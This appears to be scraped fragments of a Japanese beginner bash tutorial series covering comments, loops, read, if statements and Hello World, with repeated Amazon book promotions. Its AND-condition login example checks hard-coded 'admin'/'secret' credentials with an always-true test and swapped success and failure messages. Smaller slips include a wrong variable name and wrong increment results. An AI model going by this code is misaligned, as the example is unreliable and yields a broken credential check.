サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-03-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-03-suzuki/","title":"【３．コメント】ざっくりわかる「シェルスクリプト」"},{"content":"マルチラインコメント 複数行コメントの使用\nbashではさまざまな方法で複数行コメントを使用できます。\n次の例に簡単な方法を示します。\n\u0026lsquo;multiline-comment.sh\u0026rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。\nここでは、「:」と「\u0026rsquo;」でbashで複数行コメントを実現しています。\n次のスクリプトは、5の2乗を計算します。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; 次のスクリプトは、 数値の2乗値5を計算します。 \u0026#39; ((area=5*5)); echo \u0026#34;$area\u0026#34;; bashコマンドでファイルを実行します。\n$ bash multiline-comment.sh 25 $ ヒント 多くの場合、マルチラインコメントの存在は知られていない。 ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。 それは、過去のメジャーソースコードの冒頭にそうあるからだ。 そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。 今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:\u0026gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。\nif [ \u0026ldquo;$v\u0026rdquo; -eq 5 ];then\n: # 何もしない fi touchは既にファイルがあれば、そのファイルにはさわらない。\n:\u0026gt; は既にファイルがあれば、そのファイルさえも空にする。 上記 if 文の中の : は　何もしないことを示す。 マルチラインコメントも同じ「:」から始まり、何もしないことを示している。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-04-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-04-suzuki/","title":"【４．マルチラインコメント】ざっくりわかる「シェルスクリプト」"},{"content":"while ループ whileループの使用\nwhileループの使用法を知るために、「while_example.sh」という名前のbashファイルを作成します。\nこの例では、whileループが5回繰り返されます。\ncount変数の値は、各ステップで1ずつ増加します。\ncount変数の値が5になると、whileループは終了します。\n#!/bin/bash valid=true; count=1 while [ \u0026#34;$valid\u0026#34; ];do echo \u0026#34;$count\u0026#34;; if [ \u0026#34;$count\u0026#34; -eq 5 ];then break; fi ((count++)); done bashコマンドでファイルを実行します。\n$ bash while_example.sh 1 2 3 4 5 $ ヒント 上記ソースでトリッキーなのはwhileよりもむしろ ((COUNT++))\nだろう。\nCOUNT = COUNT + 1; count=1\ncount=$(expr $count + 1) # =\u0026gt; 2 let ++count # =\u0026gt; 2 let count++ # =\u0026gt; 3 count=$((++count)) # =\u0026gt; 2 count=$((count++)) # =\u0026gt; 2 count=$((count += 1)) # =\u0026gt; 3 変数に代入する必要がないから $(( )) ではなく、\n(( )) でよい。(( )) の中の変数を表す「$」は記述の必要はない 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-05-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-05-suzuki/","title":"【５．while ループ】ざっくりわかる「シェルスクリプト」"},{"content":"for ループ forループの使用\n基本的なforループ宣言を示します。\n\u0026lsquo;for_example.sh\u0026rsquo;という名前のファイルを作成し、forループを使用して、次のスクリプトを追加します。\nここでは、forループは10回繰り返され、変数のすべての値、counterを1行で出力します。\n#!/bin/bash for((counter=10;counter\u0026gt;0;counter--));do echo -n \u0026#34;$counter \u0026#34;; done printf \u0026#34;\\n\u0026#34; bashコマンドでファイルを実行します。\n$ bash for_example.sh 10 9 8 7 6 5 4 3 2 1 $ ヒント 以下、どの記法も同じ。書きやすいものを選べばいい。 # 冗長 for i in \\`seq 10\\` do echo \u0026#34;test\u0026#34; done # 簡素 for i in \\`seq 10\\`;do echo \u0026#34;test\u0026#34; done # C/Javaライク for((i=0;i\u0026lt;10;i++));do echo \u0026#34;test\u0026#34; done 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-06-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-06-suzuki/","title":"【６．for ループ】ざっくりわかる「シェルスクリプト」"},{"content":"対話型入力 ユーザー入力の取得\n\u0026lsquo;read\u0026rsquo;コマンドは、bashでユーザーから入力を受け取るために使用されます。\n\u0026lsquo;user_input.sh\u0026rsquo;という名前のファイルを作成し、ユーザーから入力を取得するための次のスクリプトを追加します。\nここでは、1つの文字列値がユーザーから取得され、他の文字列値を組み合わせて値が表示されます。\n#!/bin/bash echo \u0026#34;あなたの名前を入力して下さい\u0026#34; read name echo \u0026#34;ようこそ $name. ＮＬＰへ\u0026#34; bashコマンドでファイルを実行します。\n$ bash user_input.sh あなたの名前を入力して下さい suzuki ようこそ suzuki。 ＮＬＰへ $ ヒント 以下のソースは read コマンドの手前でechoすらしない -p オプションだ。 read -p \u0026ldquo;INPUT:\u0026rdquo; str\necho $str1 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-07-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-07-suzuki/","title":"【７．対話型入力】ざっくりわかる「シェルスクリプト」"},{"content":"if 文 if文を使う\n単数、または複数の条件でif条件を使用できます。\nこのステートメントの開始ブロックと終了ブロックは、「if」と「fi」で定義されます。\n「simple_if.sh」という名前のファイルを作成し、bashでのifステートメントの使用を確認します。\nここでは、変数nに10が割り当てられています。\n$nの値が10未満の場合、出力は「1桁の数値です」になります。\nそれ以外の場合、出力は「2桁の数値です」になります。\n比較のために、ここでは「-lt」を使用しています。\nオプション意味 -eq同　じ（==） -lt小さい（＜） -gt大きい（＞） #!/bin/bash n=10; if [ $n -lt 10 ];then echo \u0026#34;1桁の数値です\u0026#34;; else echo \u0026#34;2桁の数値です\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash simple_if.sh 2桁の数値です $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-08-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-08-suzuki/","title":"【８．If 文】ざっくりわかる「シェルスクリプト」"},{"content":"and 条件を if 文で使う ANDロジックでifステートメントを使用する：\n2つ以上の条件を持つifステートメントでは、さまざまなタイプの論理条件を使用できます。\nandロジックを使用してifステートメントで複数の条件を定義する方法を次の例に示します。\n\u0026lsquo;\u0026amp;\u0026amp;\u0026lsquo;は、ifステートメントのandロジックを適用するために使用されます。\n\u0026lsquo;if_with_and.sh\u0026rsquo;という名前のファイルを作成して、次のコードを確認します。\nここで、ユーザー名とパスワードの変数の値はユーザーから取得され、「admin」および「secret」と比較されます。\n両方の値が一致する場合、出力は「有効なユーザー」になります。一致しない場合、出力は「無効なユーザー」になります。\n数値を比較する場合は、「\u003c」「\u003e」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。 #!/bin/bash echo \u0026#34;名前を入力して下さい\u0026#34; read username echo \u0026#34;パスワードを入力して下さい\u0026#34; read password if [[ (\u0026#34;$username\u0026#34;==\u0026#34;admin\u0026#34; \u0026amp;\u0026amp; \u0026#34;$password\u0026#34;==\u0026#34;secret\u0026#34;) ]];then echo \u0026#34;無効なユーザーです\u0026#34;; else echo \u0026#34;有効なユーザーです\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_and.sh 名前を入力して下さい suzuki パスワードを入力して下さい password 無効なユーザーです $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-09-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-09-suzuki/","title":"【９．and 条件を if 文で使う】ざっくりわかる「シェルスクリプト」"},{"content":"はじめに Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。\nこの記事では、bashプログラミングの次のトピックについて説明します。\nHello World はじめてのbashコマンド「echo」\nターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。\n$ echo \u0026#34;Hello, World\u0026#34; Hello, World $ はじめてのbashスクリプト「vim」\n$ vim HelloWorld.sh ＜空のvim HelloWorld.sh が開きます＞ vimで開いたHelloWorld.shを編集します。\n#!/bin/bash echo \u0026#34;Hello World\u0026#34;; はじめての実行権限「chmod」\nbashファイルは2つの方法で実行できます。\n１．bashコマンドを使用する方法、\n２．bashファイルに実行権限を設定し、ファイルを実行する方法\n一つ目の方法「bashコマンドを使用する」\n$ bash HelloWorld.sh もう一つの方法「chmodで実行権限を付与する」\n# +x で実行権限を付与 $ chmod +x HelloWorld.sh # ドット　スラッシュをつけて実行 $ ./HelloWorld.sh ヒント $ ./ でファイルを実行する場合、ソースファイルの先頭行に記載されている #!/bin/bash\nという記述をつかって実行されます。\n$ ./\u0026lt;ファイル名\u0026gt;\nで実行した場合は、bashコマンド（/bin/bash 